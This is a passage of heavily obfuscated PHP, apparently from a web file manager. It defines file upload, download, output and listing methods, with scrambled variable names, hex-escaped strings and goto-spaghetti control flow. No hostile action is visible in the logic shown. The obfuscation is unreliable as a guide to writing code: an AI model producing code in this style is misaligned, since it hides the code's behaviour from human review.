$this->model->listSource($B¦·òóÍ¯±); } public function has($D£ŞÉÛ†Ú†, $Aô´à –è£ = false, $cø©öºŠÉ‡ = null) { $D¡‰êÚ·¬„ =& $_SERVER[İë¬“ÅÒÛ›]; $F—í×ĞÅëÕ = $this->infoWithChildren($D£ŞÉÛ†Ú†); if ($Aô´à –è£) { return array($D¡‰êÚ·¬„[192] => $F—í×ĞÅëÕ[$D¡‰êÚ·¬„[192]], $D¡‰êÚ·¬„[191] => $F—í×ĞÅëÕ[$D¡‰êÚ·¬„[191]]); } return $cø©öºŠÉ‡ ? $F—í×ĞÅëÕ[$D¡‰êÚ·¬„[192]] : $F—í×ĞÅëÕ[$D¡‰êÚ·¬„[191]]; } public function listAll($d³˜½çÕ©„) { $F‰Åš“×ˆ = IO::info($this->pathParse[$_SERVER[İë¬“ÅÒÛ›][76]]); if (!$F‰Åš“×ˆ) { return array(); } return $this->model->listAll($d³˜½çÕ©„); } public function getContent($c„‹å ª©“) { return $this->model->getContent($c„‹å ª©“); } public function setContent($b™Ó®Ò‚í·, $DîóË™„œ‡ = '') { return $this->model->setContent($b™Ó®Ò‚í·, $DîóË™„œ‡); } public function fileSubstr($C­Ëí‹…İ´, $EÀ»‘Âì, $aŞÅº·ßÏ) { return $this->model->fileSubstr($C­Ëí‹…İ´, $EÀ»‘Âì, $aŞÅº·ßÏ); } public function download($BÖù§Ç¢Ä¹, $dÔ”ƒõ™Œ¾ = '') { $E™ÄÃº˜Ş = $this->model->fileInfoGet($BÖù§Ç¢Ä¹); IO::copy($E™ÄÃº˜Ş[$_SERVER[İë¬“ÅÒÛ›][76]], $dÔ”ƒõ™Œ¾); return $dÔ”ƒõ™Œ¾; } public function upload($a–˜À¶ÔÓÇ, $FÈÚÏªš°, $d„—šŠ´áÑ = false, $díƒ¸Óº† = REPEAT_REPLACE) { $c´¶…ñÉÀ¨ =& $_SERVER[İë¬“ÅÒÛ›]; $c‘„¾À‘Ä¨ = $this->parse($a–˜À¶ÔÓÇ); $D§„ƒªÖ•‰ = $this->model->addFile($c‘„¾À‘Ä¨[$c´¶…ñÉÀ¨[369]], $FÈÚÏªš°, $c‘„¾À‘Ä¨[$c´¶…ñÉÀ¨[76]], $d„—šŠ´áÑ, $díƒ¸Óº†); return $this->getPathOuter($D§„ƒªÖ•‰); } public function uploadFileByID($EÚÂÍóÔ°à, $aÁ­ä¦ä£‡, $A™¡ĞŠ³İ) { $bã…„¹ŠË‘ =& $_SERVER[İë¬“ÅÒÛ›]; $f“§ì‚±êÙ = $this->parse($EÚÂÍóÔ°à); $A”Ã‘ãŠ Ø = $this->model->addFileByFileID($f“§ì‚±êÙ[$bã…„¹ŠË‘[369]], $aÁ­ä¦ä£‡, $f“§ì‚±êÙ[$bã…„¹ŠË‘[76]], $A™¡ĞŠ³İ); return $this->getPathOuter($A”Ã‘ãŠ Ø); } public function addFileByRemote($FÆ–¥’œÖä, $Fù‰›Ë«”, $eóƒñÇ½ = array(), $A„‚‡Ã¡× = '', $EƒºÍ§Íåî) { $A³±Å¡¸šÂ =& $_SERVER[İë¬“ÅÒÛ›]; $A•·äˆ”’ = $this->parse($FÆ–¥’œÖä); $A„‚‡Ã¡× = empty($A„‚‡Ã¡×) ? $A•·äˆ”’[$A³±Å¡¸šÂ[76]] : $A„‚‡Ã¡×; $dËê•Îï²¦ = $this->model->addFileByRemote($A•·äˆ”’[$A³±Å¡¸šÂ[369]], $Fù‰›Ë«”, $A„‚‡Ã¡×, $eóƒñÇ½, $EƒºÍ§Íåî); return $this->getPathOuter($dËê•Îï²¦); } public function uploadLink($F‘„ßí“äÛ, $aëÁôÒˆÇ¼ = 0) { $cè¶ØÊ– =& $_SERVER[İë¬“ÅÒÛ›]; $cˆ½Æ Á• = $this->parse($F‘„ßí“äÛ); $F‘„ßí“äÛ = Model($cè¶ØÊ–[428])->createFileName($cˆ½Æ Á•[$cè¶ØÊ–[76]]); $d¬Ã‡Šœ = IO::uploadLink($F‘„ßí“äÛ, $aëÁôÒˆÇ¼); return $d¬Ã‡Šœ; } public function fileNameAuto($bŞª²àºÑñ, $B½ÓâÔ¾¥Æ, $F­ĞÛèå“Æ = REPEAT_REPLACE, $cÑÓ …Õ˜’ = false) { return $this->model->fileNameAuto($bŞª²àºÑñ, $B½ÓâÔ¾¥Æ, $F­ĞÛèå“Æ, $cÑÓ …Õ˜’); } public function fileNameExist($F˜½Œâ¹…ƒ, $d¿‘ÑùÔõŒ) { return $this->model->fileNameExist($F˜½Œâ¹…ƒ, $d¿‘ÑùÔõŒ); } protected function _fileOut($Bº×´³“Ë–, $DÙŞõÖœ§× = false, $CƒõËèÌî = false, $eƒ ‡ÈåÌè = '', $a‚ìÙÜùÔ = false) { goto F¤ìÚø•ğË; d«ôï¼ùÙŸ: $E…ÙÔ¯¢‰± = $this->model->fileInfoGet($Bº×´³“Ë–); $eƒ ‡ÈåÌè = $E…ÙÔ¯¢‰±[$a¢„óèÀ­¾[160]] ? $E…ÙÔ¯¢‰±[$a¢„óèÀ­¾[160]] : $eƒ ‡ÈåÌè; if ($a‚ìÙÜùÔ) { return IO::fileOutServer($E…ÙÔ¯¢‰±[$a¢„óèÀ­¾[76]], $DÙŞõÖœ§×, $E…ÙÔ¯¢‰±[$a¢„óèÀ­¾[28]], $eƒ ‡ÈåÌè); } goto dçöÉØŒ§ï; F¤ìÚø•ğË: $a¢„óèÀ­¾ =& $_SERVER[İë¬“ÅÒÛ›]; $dãä·¯æ¥ = $this->model->sourceInfo($Bº×´³“Ë–); if ($dãä·¯æ¥[$a¢„óèÀ­¾[376]] == $a¢„óèÀ­¾[377]) { header($a¢„óèÀ­¾[857]); die; } goto d«ôï¼ùÙŸ; dçöÉØŒ§ï: IO::fileOut($E…ÙÔ¯¢‰±[$a¢„óèÀ­¾[76]], $DÙŞõÖœ§×, $E…ÙÔ¯¢‰±[$a¢„óèÀ­¾[28]], $eƒ ‡ÈåÌè); goto AºÒİ˜©ö½; AºÒİ˜©ö½: } public function fileOut($F¥éõÖ¶ ‚, $c˜È¦¿³°¹ = false, $añ­…”¼©É = false, $b×ğ‘˜“…ƒ = '') { $this->_fileOut($F¥éõÖ¶ ‚, $c˜È¦¿³°¹, $añ­…”¼©É, $b×ğ‘˜“…ƒ); } public function fileOutServer($cĞ÷Å¶Ø•, $f×Ó·¦Ø¯ƒ = false, $bÏ„£äèç = false, $d¹‚‚çƒåö = '') { $this->_fileOut($cĞ÷Å¶Ø•, $f×Ó·¦Ø¯ƒ, $bÏ„£äèç, $d¹‚‚çƒåö, !0); } protected function _fileOutImage($e¢‹Šœé¹, $bßÆºî˜äÍ = 250) { $fñ¡Ï…ÀîÆ =& $_SERVER[İë¬“ÅÒÛ›]; $FŒÅ…“§Œ‡ = $this->model->sourceInfo($e¢‹Šœé¹); if ($FŒÅ…“§Œ‡[$fñ¡Ï…ÀîÆ[376]] == $fñ¡Ï…ÀîÆ[377]) { show_json($fñ¡Ï…ÀîÆ[858] . $e¢‹Šœé¹, !1); } $fÏÏ¹¯‚ë = $this->model->fileInfoGet($e¢‹Šœé¹); IO::fileOutImage($fÏÏ¹¯‚ë[$fñ¡Ï…ÀîÆ[76]], $bßÆºî˜äÍ); } public function fileOutImage($E•æƒ‘½ŸŒ, $C çÍ¸ˆ = 250) { $this->_fileOutImage($E•æƒ‘½ŸŒ, $C çÍ¸ˆ); } public function fileOutImageServer($bÙÔïİ½í, $CŸÚÇóˆÈ½ = 250) { $this->_fileOutImage($bÙÔïİ½í, $CŸÚÇóˆÈ½); } public function link($cÉ˜—¬Û§, $F®¦¢¤Ôí¨ = '') { $BÀŞ²‰· = $this->model->fileInfoGet($cÉ˜—¬Û§); return IO::link($BÀŞ²‰·[$_SERVER[İë¬“ÅÒÛ›][76]], $F®¦¢¤Ôí¨); } protected function parse($Dƒ¶ “„â¦) { $C¼ËóùãÏ˜ =& $_SERVER[İë¬“ÅÒÛ›]; if (strstr($Dƒ¶ “„â¦, $C¼ËóùãÏ˜[8]) === !1) { return array($C¼ËóùãÏ˜[817] => intval($Dƒ¶ “„â¦), $C¼ËóùãÏ˜[76] => $C¼ËóùãÏ˜[33], $C¼ËóùãÏ˜[856] => array()); } $bª»²‡«½‡ = explode($C¼ËóùãÏ˜[8], trim($Dƒ¶ “„â¦, $C¼ËóùãÏ˜[8])); if (count($bª»²‡«½‡) < 2) { show_tips($Dƒ¶ “„â¦ . $C¼ËóùãÏ˜[859]); } return array($C¼ËóùãÏ˜[817] => intval($bª»²‡«½‡[0]), $C¼ËóùãÏ˜[76] => $bª»²‡«½‡[1], $C¼ËóùãÏ˜[856] => array_slice($bª»²‡«½‡, 1)); } } goto Bæ¦°·œÕ; Bƒ‰ÄÍç¥ä: class SourceListModel extends ModelBase { protected $tableName = "\x69\x6f\137\163\x6f\x75\x72\143\x65"; protected $tableMeta = array("\164\x61\142\154\x65\x4e\141\155\x65" => "\x69\157\x5f\163\157\165\162\143\145\x5f\x6d\145\164\x61", "\155\x65\x74\141\x46\x69\x65\154\x64" => "\163\157\x75\x72\x63\x65\111\104"); protected $dataAuto = array(array("\155\157\144\151\x66\x79\124\151\155\145", "\164\x69\155\x65", "\151\156\x73\145\x72\x74", "\x66\165\x6e\143\164\x69\x6f\156"), array("\143\x72\x65\141\x74\x65\124\x69\155\x65", "\x74\151\x6d\145", "\151\156\163\x65\162\164", "\x66\165\156\143\164\151\x6f\156"), array("\166\x69\145\x77\124\151\155\x65", "\164\x69\155\145", "\x69\156\163\145\162\164", "\146\165\x6e\x63\164\151\157\x6e")); protected static $cacheSourceInfo = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($Bš­²­Ÿ¸Ï) { return $this->listSource(array($_SERVER[»][0] => $Bš­²­Ÿ¸Ï)); } public function typeName($EåŠ–Æãá) { static $F¸‡ëÅ‡Œ† = array(self::TYPE_SYSTEM => "\163\171\x73\x74\x65\x6d", self::TYPE_USER => "\x75\x73\x65\x72", self::TYPE_GROUP => "\147\162\x6f\x75\160"); return $F¸‡ëÅ‡Œ†[$EåŠ–Æãá . $_SERVER[»][1]]; } public function sourceListInfo($EË®Ğø­ËÁ, $fŒÎåÇ—çç = false) { goto b«ŒË˜ç¤; b«ŒË˜ç¤: $b·óÆµç§ =& $_SERVER[»]; $EË®Ğø­ËÁ = array_filter(array_unique($EË®Ğø­ËÁ)); if (!$EË®Ğø­ËÁ) { return array(); } goto AåàØÒ¿¡õ; AåàØÒ¿¡õ: $d›±Ã™Ï¢ = $this->where(array($b·óÆµç§[2] => array($b·óÆµç§[3], $EË®Ğø­ËÁ)))->select(); $this->_listAppendAuth($d›±Ã™Ï¢); $this->_listAppendSourceInfo($d›±Ã™Ï¢, $EË®Ğø­ËÁ); goto A„ğ±Íì…; A„ğ±Íì…: if (!$fŒÎåÇ—çç) { $this->_listAppendMeta($d›±Ã™Ï¢, $EË®Ğø­ËÁ); $this->_listAppendChildren($d›±Ã™Ï¢, $EË®Ğø­ËÁ); } $this->_listAppendUser($d›±Ã™Ï¢); $this->_listAppendPath($d›±Ã™Ï¢); goto F‹è—åãê; F‹è—åãê: foreach ($d›±Ã™Ï¢ as &$B‘‹“™Ìö›) { $B‘‹“™Ìö› = $this->pathInfoFilter($B‘‹“™Ìö›); } $dÆ÷óÎ–÷Ò = array_to_keyvalue($d›±Ã™Ï¢, $b·óÆµç§[2]); return $dÆ÷óÎ–÷Ò; goto E»´œ¡Ø·; E»´œ¡Ø·: } public function pathInfoFilter($cµ£¯¤­ïÙ) { goto Fî¤µµ¹Ï; fŸÕâÀ‰‘ø: $cµ£¯¤­ïÙ[$fÌã¡Î©Š[9]] = $this->typeName($cµ£¯¤­ïÙ[$fÌã¡Î©Š[9]]); if ($cµ£¯¤­ïÙ[$fÌã¡Î©Š[6]] != 1) { $cµ£¯¤­ïÙ[$fÌã¡Î©Š[10]] = $cµ£¯¤­ïÙ[$fÌã¡Î©Š[11]]; unset($cµ£¯¤­ïÙ[$fÌã¡Î©Š[11]]); } $F’Óö¿Ø‡ = $fÌã¡Î©Š[12]; goto c¤½àé†ùÕ; AöêŒÛ‚¿†: if ($cµ£¯¤­ïÙ[$fÌã¡Î©Š[16]] && $cµ£¯¤­ïÙ[$fÌã¡Î©Š[16]][$fÌã¡Î©Š[17]] == -1) { $fÁÄ‰ùõî¹ = array_remove_value($fÁÄ‰ùõî¹, $fÌã¡Î©Š[18]); $fÁÄ‰ùõî¹ = array_remove_value($fÁÄ‰ùõî¹, $fÌã¡Î©Š[19]); $fÁÄ‰ùõî¹ = array_remove_value($fÁÄ‰ùõî¹, $fÌã¡Î©Š[20]); $fÁÄ‰ùõî¹ = array_remove_value($fÁÄ‰ùõî¹, $fÌã¡Î©Š[21]); $fÁÄ‰ùõî¹ = array_remove_value($fÁÄ‰ùõî¹, $fÌã¡Î©Š[22]); $fÁÄ‰ùõî¹ = array_remove_value($fÁÄ‰ùõî¹, $fÌã¡Î©Š[23]); } $cµ£¯¤­ïÙ = array_field_key($cµ£¯¤­ïÙ, $fÁÄ‰ùõî¹); return $cµ£¯¤­ïÙ; goto B Õñ’¢‚Ô; c¤½àé†ùÕ: $F’Óö¿Ø‡ .= $fÌã¡Î©Š[13]; $F’Óö¿Ø‡ .= $fÌã¡Î©Š[14]; $fÁÄ‰ùõî¹ = explode($fÌã¡Î©Š[15], $F’Óö¿Ø‡); goto AöêŒÛ‚¿†; Fî¤µµ¹Ï: $fÌã¡Î©Š =& $_SERVER[»]; $cµ£¯¤­ïÙ[$fÌã¡Î©Š[4]] = KodIO::make($cµ£¯¤­ïÙ[$fÌã¡Î©Š[2]]); $cµ£¯¤­ïÙ[$fÌã¡Î©Š[5]] = $cµ£¯¤­ïÙ[$fÌã¡Î©Š[6]] == 1 ? $fÌã¡Î©Š[7] : $fÌã¡Î©Š[8]; goto fŸÕâÀ‰‘ø; B Õñ’¢‚Ô: } public function listUserFav() { goto fñ†¯æò§Ç; C¹Ÿ…Á¯ä: $Aİè°¡¿„Æ = array_to_keyvalue($Aİè°¡¿„Æ, $BŒ±ñİìŒè[1], $BŒ±ñİìŒè[4]); if ($Aİè°¡¿„Æ) { $fˆ‡»¢…š˜ = $this->listSource(array($BŒ±ñİìŒè[26] => array($BŒ±ñİìŒè[27], $Aİè°¡¿„Æ))); } $fˆ‡»¢…š˜ = array_to_keyvalue($fˆ‡»¢…š˜[$BŒ±ñİìŒè[28]], $BŒ±ñİìŒè[2]); goto A‡·Êİ­¾×; A‡·Êİ­¾×: foreach ($Eäœº©·™’ as &$B²Ï‰à¦À) { $B²Ï‰à¦À = array($BŒ±ñİìŒè[29] => $B²Ï‰à¦À[$BŒ±ñİìŒè[30]], $BŒ±ñİìŒè[31] => $B²Ï‰à¦À[$BŒ±ñİìŒè[32]], $BŒ±ñİìŒè[33] => $B²Ï‰à¦À[$BŒ±ñİìŒè[4]], $BŒ±ñİìŒè[34] => $B²Ï‰à¦À[$BŒ±ñİìŒè[5]], $BŒ±ñİìŒè[35] => $B²Ï‰à¦À[$BŒ±ñİìŒè[18]], $BŒ±ñİìŒè[36] => $B²Ï‰à¦À[$BŒ±ñİìŒè[19]]); if ($B²Ï‰à¦À[$BŒ±ñİìŒè[5]] == $BŒ±ñİìŒè[25] && $fˆ‡»¢…š˜[$B²Ï‰à¦À[$BŒ±ñİìŒè[4]]]) { $B²Ï‰à¦À[$BŒ±ñİìŒè[37]] = $fˆ‡»¢…š˜[$B²Ï‰à¦À[$BŒ±ñİìŒè[4]]]; } } return $Eäœº©·™’; goto C¹ÁÅÉ„Ï§; fñ†¯æò§Ç: $BŒ±ñİìŒè =& $_SERVER[»]; $Eäœº©·™’ = Model($BŒ±ñİìŒè[24])->listData(); $Aİè°¡¿„Æ = array_filter_by_field($Eäœº©·™’, $BŒ±ñİìŒè[5], $BŒ±ñİìŒè[25]); goto C¹Ÿ…Á¯ä; C¹ÁÅÉ„Ï§: } public function listUserTag($eßç‡Ëß£é) { goto EôÏ”ãÀ ; E™˜ƒê†Ãš: $dõ“‘»İñº = array_to_keyvalue($dõ“‘»İñº, $b‚‚‰‹«§š[1], $b‚‚‰‹«§š[4]); if (!$dõ“‘»İñº) { return array(); } $bšÙÕÄÔµÉ = array($b‚‚‰‹«§š[26] => array($b‚‚‰‹«§š[27], $dõ“‘»İñº)); goto EÏ·¯ï…‡‡; EôÏ”ãÀ : $b‚‚‰‹«§š =& $_SERVER[»]; $F‘çİÌ˜·î = Model($b‚‚‰‹«§š[38])->listData(); $dõ“‘»İñº = array_filter_by_field($F‘çİÌ˜·î, $b‚‚‰‹«§š[39], $eßç‡Ëß£é); goto E™˜ƒê†Ãš; EÏ·¯ï…‡‡: return $this->listSource($bšÙÕÄÔµÉ); goto fßµ ¨‰‹ò; fßµ ¨‰‹ò: } public function listUserRecycle() { $b‡¸¹ê äÂ =& $_SERVER[»]; $cíñÚÈĞÙ£ = Model($b‡¸¹ê äÂ[40])->listData(); if (!$cíñÚÈĞÙ£) { return array(); } $bæ¨ÉÕÜ“ = array($b‡¸¹ê äÂ[26] => array($b‡¸¹ê äÂ[27], $cíñÚÈĞÙ£), $b‡¸¹ê äÂ[41] => 1); return $this->listSource($bæ¨ÉÕÜ“); } public function listSource($dÑ³ù»Ùà, $F©Úï‹®©ß = 3000) { goto CÈˆÍäÍáƒ; CÈˆÍäÍáƒ: $Bô²è¾¬ =& $_SERVER[»]; if (!isset($dÑ³ù»Ùà[$Bô²è¾¬[42]])) { $dÑ³ù»Ùà[$Bô²è¾¬[42]] = 0; } $AçœÙŸéÔ§ = $Bô²è¾¬[43]; goto DÈô¯ ¢; cêêƒõÀÚ: return $bµ‡¶¤Ä×; goto BÇ¶¡ö´øŒ; DÈô¯ ¢: $bµ‡¶¤Ä× = $this->field($AçœÙŸéÔ§)->_makeOrder()->where($dÑ³ù»Ùà)->selectPage($F©Úï‹®©ß); $this->_listDataApply($bµ‡¶¤Ä×[$Bô²è¾¬[28]]); $this->_listFilterInfo($bµ‡¶¤Ä×); goto cêêƒõÀÚ; BÇ¶¡ö´øŒ: } protected function _makeOrder() { goto E¼ë‰ÃË‹; Fóì¥²äÏ‰: if ($E¸¢İÜÜ„ == $Dš°¯äÛÌî[32]) { } $fó”Õ´ŸˆÎ = $Dš°¯äÛÌî[54] . $cÇéÅ¿ƒø”[$E¸¢İÜÜ„] . $Dš°¯äÛÌî[55] . $bÉøôãØ³š[$e÷ãø¬²Ïö]; return $this->order(rtrim(trim($fó”Õ´ŸˆÎ), $Dš°¯äÛÌî[15])); goto E…¡ÌĞÍ¸Ÿ; E¼ë‰ÃË‹: $Dš°¯äÛÌî =& $_SERVER[»]; $FéÇ‚‘Ñã = Model($Dš°¯äÛÌî[44])->get($Dš°¯äÛÌî[45]); $A¸®¯„¬Ø = Model($Dš°¯äÛÌî[44])->get($Dš°¯äÛÌî[46]); goto a¸äÚÌÍ¯ƒ; DëÑ”°´¨«: $e÷ãø¬²Ïö = Input::get($Dš°¯äÛÌî[53], $Dš°¯äÛÌî[3], $A¸®¯„¬Ø, array_keys($bÉøôãØ³š)); if (!in_array($E¸¢İÜÜ„, array_keys($cÇéÅ¿ƒø”))) { $E¸¢İÜÜ„ = $Dš°¯äÛÌî[32]; } if (!in_array($e÷ãø¬²Ïö, array_keys($bÉøôãØ³š))) { $E¸¢İÜÜ„ = $Dš°¯äÛÌî[47]; } goto Fóì¥²äÏ‰; a¸äÚÌÍ¯ƒ: $bÉøôãØ³š = array($Dš°¯äÛÌî[47] => $Dš°¯äÛÌî[48], $Dš°¯äÛÌî[49] => $Dš°¯äÛÌî[50]); $cÇéÅ¿ƒø” = array($Dš°¯äÛÌî[32] => $Dš°¯äÛÌî[32], $Dš°¯äÛÌî[22] => $Dš°¯äÛÌî[22], $Dš°¯äÛÌî[10] => $Dš°¯äÛÌî[11], $Dš°¯äÛÌî[20] => $Dš°¯äÛÌî[20], $Dš°¯äÛÌî[51] => $Dš°¯äÛÌî[21], $Dš°¯äÛÌî[18] => $Dš°¯äÛÌî[18], $Dš°¯äÛÌî[19] => $Dš°¯äÛÌî[19]); $E¸¢İÜÜ„ = Input::get($Dš°¯äÛÌî[52], $Dš°¯äÛÌî[3], $FéÇ‚‘Ñã, array_keys($cÇéÅ¿ƒø”)); goto DëÑ”°´¨«; E…¡ÌĞÍ¸Ÿ: } protected function _listDataApplyItem($F„¹Ã÷©”, $f¯Ä˜äƒÀö = false) { goto BğÔ‚¯ùóË; DÆ‰©¢›: $E—ˆë‚Á  = $this->pathInfoFilter($Cƒ÷Àí“¶ˆ[0]); return $E—ˆë‚Á ; goto D±–†‚Ø÷–; fÙœğ—Êçé: if (!$f¯Ä˜äƒÀö) { $this->_listAppendMeta($Cƒ÷Àí“¶ˆ, $aÂ™ÅÒõ¢˜); $this->_listAppendChildren($Cƒ÷Àí“¶ˆ, $aÂ™ÅÒõ¢˜); $this->_listAppendPath($Cƒ÷Àí“¶ˆ); } $this->_listAppendSourceInfo($Cƒ÷Àí“¶ˆ, $aÂ™ÅÒõ¢˜); $this->_listAppendUser($Cƒ÷Àí“¶ˆ); goto DÆ‰©¢›; BğÔ‚¯ùóË: $Cƒ÷Àí“¶ˆ = array($F„¹Ã÷©”); $aÂ™ÅÒõ¢˜ = array($F„¹Ã÷©”[$_SERVER[»][2]]); $this->_listAppendAuth($Cƒ÷Àí“¶ˆ); goto fÙœğ—Êçé; D±–†‚Ø÷–: } protected function _listDataApply(&$D°•³áÊÑä) { goto AàÏæÆÓ‰; b è¤ƒÕÂ: $this->_listAppendSourceInfo($D°•³áÊÑä, $dÅÓõÎÈ¤Ù); $this->_listAppendChildren($D°•³áÊÑä, $dÅÓõÎÈ¤Ù); $this->_listAppendUser($D°•³áÊÑä); goto A¶•èÁ¹; bÂæ„Äö¾‡: $dÅÓõÎÈ¤Ù = array_unique($dÅÓõÎÈ¤Ù); $this->_listAppendAuth($D°•³áÊÑä); $this->_listAppendMeta($D°•³áÊÑä, $dÅÓõÎÈ¤Ù); goto b è¤ƒÕÂ; A¶•èÁ¹: $this->_listAppendPath($D°•³áÊÑä); goto FÍÀ˜‚Â½; AàÏæÆÓ‰: $c’ìÆ¹’Îİ =& $_SERVER[»]; if (!$D°•³áÊÑä) { $D°•³áÊÑä = array(); return; } $dÅÓõÎÈ¤Ù = array_to_keyvalue($D°•³áÊÑä, $c’ìÆ¹’Îİ[1], $c’ìÆ¹’Îİ[2]); goto bÂæ„Äö¾‡; FÍÀ˜‚Â½: } protected function _listFilterInfo(&$B¿àØ…‚íğ) { $bÀ×šª—Ù‹ =& $_SERVER[»]; $B¿àØ…‚íğ[$bÀ×šª—Ù‹[56]] = array(); $B¿àØ…‚íğ[$bÀ×šª—Ù‹[57]] = array(); foreach ($B¿àØ…‚íğ[$bÀ×šª—Ù‹[28]] as $fõä¨šĞ) { $DŒñæç‰ = $fõä¨šĞ[$bÀ×šª—Ù‹[6]] == 1 ? $bÀ×šª—Ù‹[56] : $bÀ×šª—Ù‹[57]; $B¿àØ…‚íğ[$DŒñæç‰][] = $this->pathInfoFilter($fõä¨šĞ); } unset($B¿àØ…‚íğ[$bÀ×šª—Ù‹[28]]); } protected function _listAppendMeta(&$f“Éîå„Ö, $bÂ·ˆ¥¯†Š) { goto cĞ¼Š´Ô¨; c«ÙÁ§¿¯ƒ: foreach ($f“Éîå„Ö as &$E½¶÷Ø‰ã) { $E½¶÷Ø‰ã[$FøŒ‡ñ®‘¤[62]] = !1; if (isset($d§¢­õ”Ş’[$E½¶÷Ø‰ã[$FøŒ‡ñ®‘¤[2]]])) { $E½¶÷Ø‰ã[$FøŒ‡ñ®‘¤[62]] = $d§¢­õ”Ş’[$E½¶÷Ø‰ã[$FøŒ‡ñ®‘¤[2]]]; } if ($this->fileIsLock($E½¶÷Ø‰ã) && $E½¶÷Ø‰ã[$FøŒ‡ñ®‘¤[16]]) { $a˜££§î‚ = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $E½¶÷Ø‰ã[$FøŒ‡ñ®‘¤[16]][$FøŒ‡ñ®‘¤[17]] = AuthModel::authDisable($E½¶÷Ø‰ã[$FøŒ‡ñ®‘¤[16]][$FøŒ‡ñ®‘¤[17]], $a˜££§î‚); $E½¶÷Ø‰ã[$FøŒ‡ñ®‘¤[16]][$FøŒ‡ñ®‘¤[63]][$FøŒ‡ñ®‘¤[16]] = $E½¶÷Ø‰ã[$FøŒ‡ñ®‘¤[16]][$FøŒ‡ñ®‘¤[17]]; } } goto FÇ¦å©¦Š°; fÉšÊÄøª¹: if (!$F†·ø‹é×) { return; } $d§¢­õ”Ş’ = array(); foreach ($F†·ø‹é× as $C¬‹æ‹Ó’«) { if (!isset($d§¢­õ”Ş’[$C¬‹æ‹Ó’«[$FøŒ‡ñ®‘¤[2]]])) { $d§¢­õ”Ş’[$C¬‹æ‹Ó’«[$FøŒ‡ñ®‘¤[2]]] = array(); } $d§¢­õ”Ş’[$C¬‹æ‹Ó’«[$FøŒ‡ñ®‘¤[2]]][$C¬‹æ‹Ó’«[$FøŒ‡ñ®‘¤[60]]] = $C¬‹æ‹Ó’«[$FøŒ‡ñ®‘¤[61]]; } goto c«ÙÁ§¿¯ƒ; cĞ¼Š´Ô¨: $FøŒ‡ñ®‘¤ =& $_SERVER[»]; $B‚‚éÍ¿²Õ = array($FøŒ‡ñ®‘¤[26] => array($FøŒ‡ñ®‘¤[27], $bÂ·ˆ¥¯†Š)); $F†·ø‹é× = Model($FøŒ‡ñ®‘¤[58])->field($FøŒ‡ñ®‘¤[59])->where($B‚‚éÍ¿²Õ)->select(); goto fÉšÊÄøª¹; FÇ¦å©¦Š°: } protected function _listAppendSourceInfo(&$d”ø‡óš·Ü, $DéÆ³÷Ï»ß) { goto bŞÔÇ¥Öìâ; cÒ “ÌÕ…–: $Eƒ‰œâë“Ğ = array_to_keyvalue_group($b©ñŠà¡·è, $B©×¾¨Áğã[4], $B©×¾¨Áğã[39]); $c‘¢×ğŒÏ  = array_to_keyvalue($D‘æ³ —ïŠ, $B©×¾¨Áğã[4]); $a³¡ØÄ†ÜŠ = array_to_keyvalue_group($fˆ½›óÓÏå, $B©×¾¨Áğã[2]); goto D÷Öğ„Í¦ù; fêÖ‘¬¾£: $D‘æ³ —ïŠ = Model($B©×¾¨Áğã[24])->listData(); $fˆ½›óÓÏå = Model($B©×¾¨Áğã[65])->listSimple(); $D§»ÑÃöé¹ = array_to_keyvalue($fîÜ—±Ò½§, $B©×¾¨Áğã[30]); goto cÒ “ÌÕ…–; D÷Öğ„Í¦ù: foreach ($d”ø‡óš·Ü as &$fªÉ»°²åº) { $fªÉ»°²åº[$B©×¾¨Áğã[37]] = array($B©×¾¨Áğã[66] => 0, $B©×¾¨Áğã[67] => 0, $B©×¾¨Áğã[68] => 0); if (isset($c‘¢×ğŒÏ [$fªÉ»°²åº[$B©×¾¨Áğã[2]]])) { $fªÉ»°²åº[$B©×¾¨Áğã[37]][$B©×¾¨Áğã[69]] = 1; $fªÉ»°²åº[$B©×¾¨Áğã[37]][$B©×¾¨Áğã[70]] = $c‘¢×ğŒÏ [$fªÉ»°²åº[$B©×¾¨Áğã[2]]][$B©×¾¨Áğã[32]]; } if (isset($Eƒ‰œâë“Ğ[$fªÉ»°²åº[$B©×¾¨Áğã[2]]])) { $fªÉ»°²åº[$B©×¾¨Áğã[37]][$B©×¾¨Áğã[71]] = array(); foreach ($Eƒ‰œâë“Ğ[$fªÉ»°²åº[$B©×¾¨Áğã[2]]] as $Bô¯Å¨Ä) { $b¯×ƒÈÛ  = $D§»ÑÃöé¹[$Bô¯Å¨Ä]; $fªÉ»°²åº[$B©×¾¨Áğã[37]][$B©×¾¨Áğã[71]][] = array($B©×¾¨Áğã[72] => $b¯×ƒÈÛ [$B©×¾¨Áğã[30]], $B©×¾¨Áğã[31] => $b¯×ƒÈÛ [$B©×¾¨Áğã[32]], $B©×¾¨Áğã[73] => $b¯×ƒÈÛ [$B©×¾¨Áğã[74]]); } } if (isset($a³¡ØÄ†ÜŠ[$fªÉ»°²åº[$B©×¾¨Áğã[2]]])) { $fªÉ»°²åº[$B©×¾¨Áğã[37]][$B©×¾¨Áğã[75]] = array(); foreach ($a³¡ØÄ†ÜŠ[$fªÉ»°²åº[$B©×¾¨Áğã[2]]] as $AïÌ…ò‹ëô) { $fªÉ»°²åº[$B©×¾¨Áğã[37]][$B©×¾¨Áğã[75]] = array($B©×¾¨Áğã[76] => $AïÌ…ò‹ëô[$B©×¾¨Áğã[77]], $B©×¾¨Áğã[78] => $AïÌ…ò‹ëô[$B©×¾¨Áğã[79]], $B©×¾¨Áğã[80] => $AïÌ…ò‹ëô[$B©×¾¨Áğã[2]], $B©×¾¨Áğã[81] => $AïÌ…ò‹ëô[$B©×¾¨Áğã[82]], $B©×¾¨Áğã[83] => $AïÌ…ò‹ëô[$B©×¾¨Áğã[84]]); } } } return $d”ø‡óš·Ü; goto C†…ªÒøÆŒ; bŞÔÇ¥Öìâ: $B©×¾¨Áğã =& $_SERVER[»]; $fîÜ—±Ò½§ = Model($B©×¾¨Áğã[64])->listData(); $b©ñŠà¡·è = Model($B©×¾¨Áğã[38])->listData(); goto fêÖ‘¬¾£; C†…ªÒøÆŒ: } protected function _listAppendChildren(&$a»ğ—©…Œ’, $b£ˆô†¦™º) { goto b°¸–²¥¾¦; FáÖ‹ˆö˜Á: for ($BÓµ“¥ÓË¼ = 0; $BÓµ“¥ÓË¼ < $AäŒ®Á£¯; $BÓµ“¥ÓË¼++) { if ($a»ğ—©…Œ’[$BÓµ“¥ÓË¼][$Dõ“¯Ñ‹¥Ì[6]]) { $b‚š…íğ³à = 